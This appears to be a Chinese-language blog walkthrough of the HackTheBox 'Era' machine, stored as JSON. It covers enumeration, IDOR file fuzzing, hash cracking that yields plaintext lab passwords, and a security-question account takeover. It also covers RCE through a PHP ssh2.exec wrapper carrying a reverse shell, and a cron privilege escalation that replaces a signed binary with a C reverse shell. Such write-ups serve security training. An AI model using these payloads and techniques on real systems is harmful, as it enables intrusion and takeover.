{
  "id": 1760068481791,
  "title": "HackTheBox Era",
  "slug": "htb-era",
  "date": "2025-09-06",
  "isEncrypted": false,
  "html": "<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1757136572856-7f126e70-cbdd-419e-800e-3da8a222ed81.png\" alt=\"\"></p>\n<pre><code class=\"language-bash\">nmap -T4 -v -A -Pn 10.10.11.79 -oN era.txt\n</code></pre>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1757136655535-6bd3a588-de01-45e7-9d3b-47404bd73fe4.png\" alt=\"\"></p>\n<p>80 port，添加域名/etc/hosts</p>\n<h1>USER</h1>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1757136751837-fadb71a9-93de-4364-9964-42dd569f036f.png\" alt=\"\"></p>\n<p>有几个用户名记一下先</p>\n<p>Tom Rensed 、Kathren Mory、Lancer Jack </p>\n<p>顺路扫一下目录和子域名</p>\n<pre><code class=\"language-bash\">ffuf -w /home/kali/dict/fuzzDicts/subdomainDicts/main.txt -u &quot;http://era.htb&quot; -H &quot;host:FUZZ.era.htb&quot; -c -fc 302\n</code></pre>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1757137220766-191d19a2-1a49-4ab6-8649-f9a89481c791.png\" alt=\"\"></p>\n<p>加入/etc/hosts，访问一下</p>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1757137244842-e91b90be-3377-4ead-b484-22da5c5a7040.png\" alt=\"\"></p>\n<p><a href=\"http://file.era.htb/login.php\">http://file.era.htb/login.php</a></p>\n<p><a href=\"http://file.era.htb/security_login.php\">http://file.era.htb/security_login.php</a></p>\n<p><a href=\"http://file.era.htb/register.php\">http://file.era.htb/register.php</a></p>\n<p>有个注册的地方可以试试</p>\n<p>然后直接登录进去，可以看到一个上传文件的地方，上传之后点击可以下载</p>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1757137936497-ff31ccf0-feb6-4688-926e-9748acd5e6dc.png\" alt=\"\"></p>\n<h2>FUZZ id</h2>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1757137903804-411e183c-3972-4760-a6c1-76b9c4914e11.png\" alt=\"\"></p>\n<p>可以看到这个 url，文件靠 id 来区分，那可以遍历一下，要带上 cookie，因为这是登录之后的</p>\n<pre><code class=\"language-bash\">ffuf -w &lt;(seq 1 10000) -u &quot;http://file.era.htb/download.php?id=FUZZ&quot; -H &quot;Cookie:PHPSESSID=o449nm1ka507qstm3mvsq69c2n&quot; -c -fs 7686\n</code></pre>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1757138217634-b38ed3f2-a4c7-4450-bdc8-97253cc54deb.png\" alt=\"\"></p>\n<p>一个是签名文件，一个看着备份文件</p>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1757138349999-47ecdede-d3ab-4eb3-92b6-4c98bd2fdfd1.png\" alt=\"\"></p>\n<p>解压后下面有个 filedb.sqlite</p>\n<p>打开后有个 user 表</p>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1757139416319-0d646c0b-603a-454d-b37a-60e4e9385bfe.png\" alt=\"\"></p>\n<p>爆破一下</p>\n<pre><code class=\"language-bash\">hashcat -m 3200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt --show\n</code></pre>\n<p>跑出来两个</p>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1757139816634-88bae963-6d85-4b5f-8960-ceb9b67e06e8.png\" alt=\"\"></p>\n<p>eric：america</p>\n<p>yuri：mustang</p>\n<h2>LFI</h2>\n<p>但是这两个用户的管理平台都没有东西，回去看看其他文件</p>\n<p>download.php 里面这里逻辑<code>show=true</code> 且用户是 admin  则可以进入下面 else if 逻辑</p>\n<p>下面的逻辑没有验证很多，是可以触发 LFI 的</p>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1757143279179-4b638f99-1ada-4686-a3f8-bc227283ec22.png\" alt=\"\"></p>\n<p>但是没有 admin 的账号没密码，想到有个密保登录，可以试试</p>\n<p>对应的源码应该是 security_login.php</p>\n<p>这里可以看到对应的应该就是密保问题</p>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1757144512200-03e4272b-5568-4ab5-a029-e4bfa37821c8.png\" alt=\"\"></p>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1757144498729-e8fcfa69-4653-4bad-9f98-3416fd82bf60.png\" alt=\"\"></p>\n<p>直接再外面使用安全密保登录会失败，回到后台，会发现有更改安全问题的</p>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1757144664782-0bc524dc-5845-4dd2-996d-3ce169b02a33.png\" alt=\"\"></p>\n<p>全部更改之后，可以直接登录上去，厉害了</p>\n<p>但是这个时候用之前的思路 php 伪协议读取文件行不通</p>\n<pre><code class=\"language-bash\">http://file.era.htb/download.php?id=54&amp;show=true&amp;format=php://filter/read=convert.base64-encode/resource=/etc/passwd\n</code></pre>\n<p>所以又要换，发现了 yuri 可以登录到 ftp</p>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1757144874164-d32f9b4c-5006-48b4-9726-782998a22f89.png\" alt=\"\"></p>\n<p>里面有 ssh2 的扩展，可以结合进行利用</p>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1757145162408-f08f1c81-ccdb-4c4c-a75b-297e660e3341.png\" alt=\"\"></p>\n<pre><code class=\"language-bash\">http://file.era.htb/download.php?id=54&amp;show=true&amp;format=ssh2.exec://eric:america@127.0.0.1/bash%20-c%20%27echo%20&lt;base64 reverse shell&gt;|base64%20-d|bash%27;\n</code></pre>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1757145763482-926e730f-7a1b-45af-b9de-e37435253df9.png\" alt=\"\"></p>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1757145785332-03dd9a52-9142-4062-85a2-8c6ef2365e01.png\" alt=\"\"></p>\n<p>顺路起个伪终端</p>\n<pre><code class=\"language-bash\">python3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;);&#39;\n</code></pre>\n<p>这里就可以看到 user.txt 了</p>\n<h1>ROOT</h1>\n<h2>cron</h2>\n<p>sudo -l 没有上传 linpeas.sh，开跑</p>\n<p>也没什么东西，上传 pspy</p>\n<pre><code class=\"language-bash\">pspy -cpf -i 1000\n</code></pre>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1757146783563-eab6b080-d307-4f9b-b65a-dea6e8753d36.png\" alt=\"\"></p>\n<p>现在这里面很重要的流程是</p>\n<p><code>objcopy --dump-section .text_sig=text_sig_section.bin /opt/AV/periodic-checks/monitor</code> 检查monitor 的.text_sig 文件，校验文件完整性</p>\n<p>然后就会执行</p>\n<p><code>/opt/AV/periodic-checks/monitor</code></p>\n<p>所以我们可以覆盖 monitor 为一个反弹 shell 的文件，同时这个 reverse shell 文件需要有.text_sig 与原monitor 保持一致</p>\n<pre><code class=\"language-bash\">#include&lt;stdlib.h&gt;\n\nint main(){\n        system(&quot;bash &gt;&amp; /dev/tcp/&lt;ip&gt;/5566 0&gt;&amp;1&quot;);\n        return 0;\n}\n</code></pre>\n<pre><code class=\"language-bash\">gcc payload.c -o reshell\n</code></pre>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1757147458617-d74bfc09-3230-4872-95a8-cabe1d6bb48d.png\" alt=\"\"></p>\n<p>导出原monitor 的.text_sig，然后加入我们的 reshell</p>\n<p>最后复覆盖 monitor</p>\n<pre><code class=\"language-bash\">objcopy --dump-section .text_sig=ikun /opt/AV/periodic-checks/monitor\nobjcopy --add-section .text_sig=ikun reshell\ncp /home/eric/reshell monitor\n</code></pre>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1757147711412-23048a59-228d-458f-b097-9f86e99818e7.png\" alt=\"\"></p>\n<p>等着就行了，就可以拿到</p>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1757148489932-e51e9de3-a8a5-468a-a1a3-6f02746a81fa.png\" alt=\"\"></p>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1757148557830-0f444a84-db19-419b-aaa2-d4bdb52d9ce8.png\" alt=\"\"></p>\n"
}